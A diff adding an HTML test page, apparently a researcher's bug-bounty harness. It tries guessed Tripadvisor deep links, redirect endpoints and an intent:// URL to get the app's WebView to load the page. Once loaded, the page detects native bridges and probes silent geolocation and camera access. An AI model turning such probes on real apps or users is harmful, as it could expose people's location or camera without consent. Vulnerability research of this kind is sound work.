@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tripadvisor WebView Deep-Link Test</title>
+<style>
+  body{font-family:system-ui,sans-serif;margin:16px;line-height:1.45;color:#111}
+  h1{font-size:20px} h2{font-size:16px;margin-top:24px}
+  .warn{background:#fff3cd;border:1px solid #e0a800;padding:10px;border-radius:8px}
+  .ok{background:#e6f4ea;border:1px solid #34a853;padding:10px;border-radius:8px}
+  a.btn{display:block;margin:8px 0;padding:12px;background:#00af87;color:#fff;text-decoration:none;border-radius:8px;text-align:center;font-weight:600}
+  a.alt{background:#545454}
+  button{display:block;width:100%;margin:8px 0;padding:12px;border:0;border-radius:8px;background:#222;color:#fff;font-weight:600}
+  pre{background:#111;color:#0f0;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;min-height:80px}
+  code{background:#eee;padding:1px 4px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>Tripadvisor — deep-link → WebView test</h1>
+
+<div class="warn">
+<b>Setup:</b> Host this exact file somewhere public (e.g. GitHub Pages, like your Moovit lab)
+and open <i>that hosted URL</i> in Chrome on the phone. Do not test from <code>file://</code> —
+the test links point back at this page's own URL, which only works when hosted over https.
+Log in to Tripadvisor first, and make sure the app already has <b>Location permission granted</b>
+(Settings → Apps → Tripadvisor → Permissions) — the silent-geolocation behaviour only appears then.
+</div>
+
+<h2>0. Where am I right now?</h2>
+<pre id="env">checking…</pre>
+
+<h2>1. Run permission probes on THIS page</h2>
+<p>If this page is ever loaded <i>inside</i> the Tripadvisor WebView, these probes tell us what it can do.
+They also auto-run 1 second after the page loads with <code>#inwebview</code> in the URL.</p>
+<button onclick="testGeo()">📍 Test geolocation</button>
+<button onclick="testCam()">📷 Test camera (getUserMedia)</button>
+<pre id="log"></pre>
+
+<h2>2. Deep-link attempts</h2>
+<p>Tap each link. Watch what happens and note it down:</p>
+<ul>
+<li><b>Nothing / app opens at home screen</b> → link rejected or routed natively. Expected, safe.</li>
+<li><b>Browser opens example.com</b> → link handed off externally. Safe by design.</li>
+<li><b>THIS test page re-opens inside the Tripadvisor app</b> (look for the green banner / bridge detection in section 0) → ⚠️ <b>that is the finding path</b> — then run the probes in section 1 and screenshot/film everything.</li>
+</ul>
+
+<div id="links"></div>
+
+<h2>3. What to record</h2>
+<ol>
+<li>Screen-record the whole session (you already have this workflow from Moovit).</li>
+<li>For each numbered link: what opened (app home / native screen / browser / this page inside the app / error).</li>
+<li>If this page loads inside the app: screenshot section 0 (bridge detection) and the probe results —
+a silent geolocation <b>success with coordinates</b> (no prompt) inside Tripadvisor would be the money shot. Send the recording to me before writing anything up.</li>
+</ol>
+
+<script>
+const self = location.href.split('#')[0];
+const target = encodeURIComponent(self + '#inwebview');
+const ext = encodeURIComponent('https://example.com/');
+
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+
+// --- environment / bridge detection ---
+(function(){
+  const inTA = {
+    jsBridge: typeof window.jsBridge !== 'undefined',
+    GooglePayAndroidApi: typeof window.GooglePayAndroidApi !== 'undefined',
+    UA: navigator.userAgent
+  };
+  const el = document.getElementById('env');
+  el.textContent = JSON.stringify(inTA, null, 2);
+  if (inTA.jsBridge || inTA.GooglePayAndroidApi) {
+    const b = document.createElement('div');
+    b.className = 'ok';
+    b.innerHTML = '<b>⚠️ THIS PAGE IS RUNNING INSIDE A TRIPADVISOR WEBVIEW</b> (native bridge detected). Run the probes below now and film it.';
+    document.body.insertBefore(b, document.body.children[1]);
+  }
+})();
+
+function testGeo(){
+  log('--- geolocation test ' + new Date().toLocaleTimeString());
+  if (!navigator.geolocation) { log('geolocation API not present'); return; }
+  const t0 = Date.now();
+  navigator.geolocation.getCurrentPosition(
+    p => log('✅ GEO SUCCESS (was there a permission prompt? note it!) lat=' +
+             p.coords.latitude.toFixed(5) + ' lon=' + p.coords.longitude.toFixed(5) +
+             ' accuracy=' + Math.round(p.coords.accuracy) + 'm in ' + (Date.now()-t0) + 'ms'),
+    e => log('❌ GEO ERROR code=' + e.code + ' (' + e.message + ') in ' + (Date.now()-t0) + 'ms'),
+    {timeout: 10000, maximumAge: 0}
+  );
+}
+function testCam(){
+  log('--- camera test ' + new Date().toLocaleTimeString());
+  if (!navigator.mediaDevices) { log('mediaDevices API not present'); return; }
+  navigator.mediaDevices.getUserMedia({video: true})
+    .then(s => { log('✅ CAMERA SUCCESS — stream obtained! stop it and film this.'); s.getTracks().forEach(t => t.stop()); })
+    .catch(e => log('❌ CAMERA ERROR ' + e.name + ': ' + e.message));
+}
+if (location.hash.includes('inwebview')) {
+  log('Loaded with #inwebview — auto-running geolocation probe in 1s…');
+  setTimeout(testGeo, 1000);
+}
+
+// --- deep-link candidates ---
+const tests = [
+  // custom-scheme guesses: arbitrary-url params
+  ['tripadvisor://webview?url=' + target, 'A1 tripadvisor://webview?url=<this page>'],
+  ['tripadvisor://showurl?url=' + target, 'A2 tripadvisor://showurl?url=<this page>'],
+  ['tripadvisor://open?url=' + target, 'A3 tripadvisor://open?url=<this page>'],
+  ['tripadvisor://browser?url=' + target, 'A4 tripadvisor://browser?url=<this page>'],
+  ['tripadvisor_mobile://webview?url=' + target, 'A5 tripadvisor_mobile://webview?url=<this page>'],
+  ['tripadvisor://webview?url=' + ext, 'A6 tripadvisor://webview?url=example.com (control)'],
+  // TA https app-link shapes that route to web content server-side
+  ['https://www.tripadvisor.com/ShowUrl?url=' + target, 'B1 TA /ShowUrl?url=<this page>'],
+  ['https://www.tripadvisor.com/pages/showurl?url=' + target, 'B2 TA /pages/showurl?url=<this page>'],
+  ['https://www.tripadvisor.com/ThirdPartyRedirect?url=' + target, 'B3 TA /ThirdPartyRedirect?url=<this page>'],
+  ['https://www.tripadvisor.com/commerce?url=' + target, 'B4 TA /commerce?url=<this page>'],
+  ['https://www.tripadvisor.com/MptUrl?url=' + target, 'B5 TA /MptUrl?url=<this page>'],
+  ['https://www.tripadvisor.com/ShowUrl?url=' + ext, 'B6 TA /ShowUrl?url=example.com (control)'],
+  // onelink resolver (follows redirects server/client-side)
+  ['https://tripadvisor.onelink.me/?af_dp=' + encodeURIComponent('tripadvisor://webview?url=' + self), 'C1 onelink af_dp nested webview attempt'],
+  // Android intent:// fallback (Chrome)
+  ['intent://webview?url=' + target + '#Intent;scheme=tripadvisor;package=com.tripadvisor.tripadvisor;end',
+   'D1 intent:// scheme=tripadvisor webview?url=<this page>'],
+];
+
+const box = document.getElementById('links');
+tests.forEach(([href, label], i) => {
+  const a = document.createElement('a');
+  a.className = 'btn' + (i % 2 ? ' alt' : '');
+  a.href = href;
+  a.textContent = label;
+  box.appendChild(a);
+});
+</script>
+</body>
+</html>
